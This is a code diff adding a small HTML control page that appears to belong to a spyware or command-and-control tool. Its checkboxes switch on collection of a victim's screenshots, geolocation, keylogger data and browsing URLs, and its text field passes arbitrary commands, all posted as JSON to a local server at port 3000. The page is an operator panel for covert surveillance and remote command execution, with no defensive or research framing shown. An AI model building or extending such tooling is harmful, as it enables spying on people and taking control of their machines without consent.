@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+	<body>
+
+	<input type="checkbox" id="getScreenshots" name="screenhot" checked>
+	<label for="screenhot"> Get Screenshots</label><br>
+	
+	<input type="checkbox" id="getGeo" name="geolocation" checked>
+	<label for="geolocation"> Get Geolocation Data</label><br>
+	
+	<input type="checkbox" id="getKeylog" name="keylog" checked>
+	<label for="keylog"> Get Keylogger Data </label><br>
+	
+	<input type="checkbox" id="getUrls" name="url" checked>
+	<label for="url"> Get URL Data </label><br>
+	<br>
+
+	<input type="text" id="myCmd"><br><br>
+	<button id="sendCmd">Send Command</button>
+	
+	<script>
+	
+		document.getElementById("sendCmd").addEventListener("click", function() {	
+			var xhr = new XMLHttpRequest();
+		    xhr.open("POST", "http://127.0.0.1:3000", true);
+		    xhr.setRequestHeader('Content-Type', 'application/json');
+		    xhr.setRequestHeader('Access-Control-Allow-Headers', '*');
+   		    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
+		    xhr.setRequestHeader('Accept', '*/*');
+
+		    cmd_json = create_param_string()
+		    console.log(cmd_json)
+		    xhr.send(cmd_json);
+		
+		});
+		
+		function create_param_string() {
+			var screenshot_checkbox = document.getElementById("getScreenshots");
+			var geolocation_checkbox = document.getElementById("getGeo");
+			var keylog_checkbox = document.getElementById("getKeylog");
+			var urls_checkbox = document.getElementById("getUrls");
+			var cmd_form = document.getElementById("myCmd");
+
+			var json_data = '{"logtype": "SEND_CMD", '
+			json_data += '"screenshots": "'+screenshot_checkbox.checked+'", '
+			json_data += '"geolocation": "'+geolocation_checkbox.checked+'", '
+			json_data += '"keylog": "'+keylog_checkbox.checked+'", '
+			json_data += '"urls": "'+urls_checkbox.checked+'", '
+			json_data += '"cmd": "'+cmd_form.value+'"}'
+			return json_data
+		}
+	</script>	
+	</body>	
+</html>
